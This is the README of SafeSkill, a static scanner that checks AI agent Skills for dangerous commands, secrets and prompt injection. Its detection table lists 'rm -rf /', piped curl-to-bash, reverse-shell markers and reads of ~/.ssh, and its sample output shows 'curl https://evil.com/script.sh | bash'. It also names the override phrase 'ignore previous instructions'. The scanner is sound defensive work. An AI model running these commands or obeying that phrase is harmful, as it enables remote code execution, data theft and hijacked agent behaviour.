<div align="center">

# 🔒 SafeSkill

**A security scanner for AI Skills — detect dangerous commands, hardcoded secrets, prompt injection patterns, and suspicious behavior before installation or execution.**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.9%2B-green.svg)](https://python.org)
[![Version](https://img.shields.io/badge/version-0.4.1-blue.svg)](https://github.com/AIPMAndy/safeskill)
[![Tests](https://github.com/AIPMAndy/safeskill/actions/workflows/test.yml/badge.svg)](https://github.com/AIPMAndy/safeskill/actions/workflows/test.yml)
[![Security Scan](https://github.com/AIPMAndy/safeskill/actions/workflows/security-scan.yml/badge.svg)](https://github.com/AIPMAndy/safeskill/actions/workflows/security-scan.yml)

**English | [简体中文](README.md)**

*Think of it as antivirus for AI Skills: scan first, install later.*

</div>

---

## Why SafeSkill?

AI Skills / Agent Skills are growing fast, but most people do **not** audit them line by line before installing them.
That creates obvious risk:

- one `curl | bash` can execute a remote script
- one hardcoded token can leak credentials
- one prompt injection string can manipulate an agent's behavior
- one read on `~/.ssh` or `/etc/passwd` is already crossing the line

**SafeSkill exists to surface those risks before the Skill is trusted.**

---

## What is SafeSkill?

> **SafeSkill = a static security scanner (SAST) for AI Skills**

Point it at a Skill directory and it will generate:

- findings
- severity levels (Critical / High / Medium / Low / Clean)
- a 0-100 risk score
- reports in text / Markdown / JSON / SARIF

Good fit for:

- checking third-party Skills before installation
- scanning your own Skill before publishing
- adding a security gate in CI/CD
- batch-auditing internal Skill libraries

---

## 🆚 Why use this instead of generic tools?

| Capability | Generic lint / formatter | Manual review | **SafeSkill** |
|-----------|---------------------------|---------------|---------------|
| Find syntax/style issues | ✅ | ✅ | ❌ |
| Detect dangerous commands | ❌ | ✅ | ✅ |
| Detect exposed secrets | ❌ | ✅ | ✅ |
| Detect prompt injection patterns | ❌ | ✅ | ✅ |
| Produce a risk score | ❌ | ❌ | ✅ |
| CI-friendly | 🟡 | ❌ | ✅ |
| Low setup cost | ✅ | ❌ | ✅ |

**SafeSkill is not a full replacement for security review. It automates the most common and high-value checks for Skill ecosystems.**

---

## 🚀 30-second quick start

### Option 1: run directly

```bash
git clone https://github.com/AIPMAndy/safeskill.git
cd safeskill
python3 safeskill.py ./your-skill
```

### Option 2: install as a CLI

```bash
git clone https://github.com/AIPMAndy/safeskill.git
cd safeskill
pip install -e .
safeskill ./your-skill
```

### Generate different report formats

```bash
# Markdown report
python3 safeskill.py ./your-skill --format markdown -o report.md

# JSON report for CI/CD
python3 safeskill.py ./your-skill --format json --quiet

# SARIF for GitHub Code Scanning
python3 safeskill.py ./your-skill --format sarif -o safeskill-results.sarif
```

---

## What can it detect?

### Covered risk categories

| Risk category | Example | Why it matters |
|--------------|---------|----------------|
| Dangerous commands | `rm -rf /`, `curl ... | bash` | system destruction / remote execution |
| Reverse shell | `bash -i`, `nc -e` | unauthorized remote access |
| Credential exposure | `api_key=...`, `token=...` | hardcoded secrets |
| Prompt injection | `ignore previous instructions` | override agent constraints |
| Data exfiltration | `requests.post(json=...)` | suspicious outbound transfer |
| Sensitive file access | `~/.ssh`, `/etc/passwd` | reading sensitive paths |
| Dynamic execution | `eval()`, `exec()` | code injection risk |
| Privilege escalation | `sudo`, `chmod 777` | excessive permissions |
| Weak crypto / unsafe practice | `md5`, `sha1`, `debug=True` | insecure implementation |

---

## Example output

```bash
$ python3 safeskill.py ./dangerous-skill

==================================================
🔒 SkillGuard Security Report
==================================================

Risk Score: 45/100 (HIGH)
Files Scanned: 5
Total Findings: 3

🔴 CRITICAL: 1
🟠 HIGH: 2

--------------------------------------------------

🔴 [CRITICAL] Dangerous System Command
   File: install.sh:3
   Match: curl https://evil.com/script.sh | bash
   Dangerous command that can destroy system or execute remote code

🟠 [HIGH] Hardcoded Credentials
   File: config.py:12
   Match: api_key = "sk-abc123xyz789"
   Hardcoded credentials in source code
```

---

## Core features

### 1) Built for Skills, not generic repos
This is optimized for patterns commonly found in Skills, agent scripts, and automation snippets.

### 2) Multiple report formats
- `text` for terminal output
- `markdown` for sharing and archives
- `json` for programmatic use
- `sarif` for GitHub Code Scanning

### 3) Configurable exclusions and rules
Use `.safeskill.yml` to:
- configure extensions
- exclude directories/files
- disable rules
- override severities
- add custom rules

### 4) CI/CD friendly
SafeSkill can serve as a lightweight security gate in pull requests and release pipelines.

---

## Example config

```yaml
scan:
  exclude_dirs:
    - .git
    - node_modules
  exclude_files:
    - "README*.md"
    - "tests/*"

rules:
  disabled:
    - todo_fixme

  severity:
    network_request: LOW

  custom:
    - id: custom_api_key
      name: Custom API Key Pattern
      level: HIGH
      pattern: "mycompany_api_key\\s*=\\s*['\"]\\w+"
      description: "Hardcoded company API key"
      remediation: "Use environment variables for API keys"
```

---

## GitHub Actions integration

```yaml
name: Skill Security Scan

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install -e .
      - run: python safeskill.py . --format json --fail-on high --quiet
```

Use `sarif` output if you want to upload results into GitHub Code Scanning.

---

## Project status

### Done
- [x] core rule set
- [x] risk scoring
- [x] Text / Markdown / JSON / SARIF reports
- [x] `.safeskill.yml` config support
- [x] basic GitHub Actions integration

### Next good moves
- [ ] better contextual analysis to reduce false positives
- [ ] more languages and file types
- [ ] richer rule test corpus
- [ ] rule marketplace / community sharing
- [ ] web UI / hosted API

See [ROADMAP.md](ROADMAP.md) for more.

---

## Who is this for?

- people who want to inspect third-party Skills before trusting them
- Skill authors who want a basic self-check before publishing
- Agent platforms / Skill marketplaces that need lightweight security screening
- teams using AI automation in production and wanting a safer default

---

## Author

**AI Chief Andy**

Former AI product lead at Tencent and Baidu, focused on:
- AI Agents
- Skill ecosystems
- AI safety and trustworthy usage
- AI productization and automation systems

GitHub: [@AIPMAndy](https://github.com/AIPMAndy)

---

## License

[Apache-2.0](LICENSE)

---

<div align="center">

**If this project is useful, give it a Star ⭐**

SafeSkill is a small tool, but it can add a much-needed layer of security common sense to the AI Skill ecosystem.

</div>
